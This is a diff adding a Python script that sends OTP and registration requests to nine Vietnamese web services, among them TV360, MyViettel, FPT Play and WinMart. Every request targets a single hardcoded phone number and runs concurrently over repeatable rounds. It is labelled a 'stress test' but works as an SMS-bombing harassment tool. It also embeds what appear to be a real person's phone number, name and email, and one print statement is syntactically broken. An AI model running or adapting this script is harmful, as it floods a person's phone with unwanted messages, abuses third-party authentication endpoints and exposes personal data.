@@ -1,0 +1,131 @@
+import concurrent.futures
+import json
+import requests
+
+TARGET_PHONE = "0866513734"
+
+HEADERS = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36",
+    "Content-Type": "application/json",
+    "Accept": "application/json, text/plain, */*"
+}
+
+ENDPOINTS = [
+    {
+        "name": "TV360",
+        "url": "https://tv360.vn/public/v1/auth/get-otp-login",
+        "method": "POST",
+        "payload": {"msisdn": TARGET_PHONE}
+    },
+    {
+        "name": "VTV Digital",
+        "url": "https://api.vtvdigital.org/user-core-api/v21.0/auth/password/reset/start",
+        "method": "POST",
+        "payload": {
+            "phase": "START",
+            "client_id": "91b60c77-2abf-452d-aed1-da1dc142cdb0",
+            "device_id": "ab8c33c5-4f5a-48e4-b16b-5d1992a7ee5f",
+            "login_hint": f"+84{TARGET_PHONE[1:]}"
+        }
+    },
+    {
+        "name": "MyViettel",
+        "url": f"https://apigami.viettel.vn/mvt-api/myviettel.php/getOTPCommon?lang=vi&phone={TARGET_PHONE}&actionCode=myviettel%3A%2F%2Flogin_mobile&typeCode=DI_DONG&type=otp_login&isResetOtp=false",
+        "method": "GET",
+        "payload": None
+    },
+    {
+        "name": "Viettel Store",
+        "url": "https://viettelstore.vn/Site/_Sys/Ajax.aspx",
+        "method": "POST",
+        "payload": {
+            "a": "customer-service",
+            "methodName": "POST",
+            "path": "/profile/v1/customer/register/otp/send",
+            "withAuth": False,
+            "requestBody": json.dumps({"phoneNumber": TARGET_PHONE, "channel": "CARRIER"})
+        }
+    },
+    {
+        "name": "Mocha",
+        "url": f"https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp?msisdn={TARGET_PHONE}&languageCode=vi",
+        "method": "GET",
+        "payload": None
+    },
+    {
+        "name": "FPT Play",
+        "url": "https://api.fptplay.net/api/v7.1_w/account/otp/resend_otp?st=WSbXdhsUHFqK7Pku3Fh31g&e=1793616371&device=Google+Chrome(version%3A156.0.8078.76)&drm=1&version=8.8.23",
+        "method": "POST",
+        "payload": {
+            "client_id": "vKyPNd1iWHodQVknxcvZoWz74295wnk8",
+            "method_otp": "sms",
+            "phone": TARGET_PHONE,
+            "type_otp": "login_fpl"
+        }
+    },
+    {
+        "name": "VieON",
+        "url": "https://api.vieon.vn/backend/user/v2/register?platform=web&ui=012021",
+        "method": "POST",
+        "payload": {
+            "username": TARGET_PHONE,
+            "country_code": "VN",
+            "model": "Windows 10",
+            "device_id": "3c49a2c93bdda22b955819c0069f8e24",
+            "device_name": "Chrome/156",
+            "device_type": "desktop",
+            "platform": "web",
+            "ui": "012021"
+        }
+    },
+    {
+        "name": "Lottemart",
+        "url": "https://www.lottemart.vn/v1/p/mart/bos/vi_bdh/V1/mart-sms/sendotp",
+        "method": "POST",
+        "payload": {
+            "username": TARGET_PHONE,
+            "case": "register",
+            "channel": "sms"
+        }
+    },
+    {
+        "name": "WinMart",
+        "url": "https://api-crownx.winmart.vn/as/api/plg/v1/user/register",
+        "method": "POST",
+        "payload": {
+            "phoneNumber": TARGET_PHONE,
+            "fullName": "Tran Thi Huyen Trang",
+            "email": "lainguyenbinhkhang@gmal.com",
+            "password": "1234567890"
+        }
+    }
+]
+
+def send_request(endpoint):
+    name = endpoint["name"]
+    url = endpoint["url"]
+    method = endpoint["method"]
+    payload = endpoint["payload"]
+
+    try:
+        session = requests.Session()
+        if method == "POST":
+            response = session.post(url, headers=HEADERS, json=payload, timeout=10)
+        else:
+            response = session.get(url, headers=HEADERS, timeout=10)
+        
+        return f"[{name}] Status: {response.status_code} - Response: {response.text[:150]}"
+    except Exception as e:
+        return f"[{name}] Error: {str(e)}"
+
+def run_stress_test(rounds=1):
+    print(f"[*] Starting stress test for phone: {TARGET_PHONE} ({rounds} round(s))\n")
+    for r in range(rounds):
+        print(--- Round {r+1} ---)
+        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
+            results = executor.map(send_request, ENDPOINTS)
+            for res in results:
+                print(res)
+
+if __name__ == "__main__":
+    run_stress_test(rounds=1)
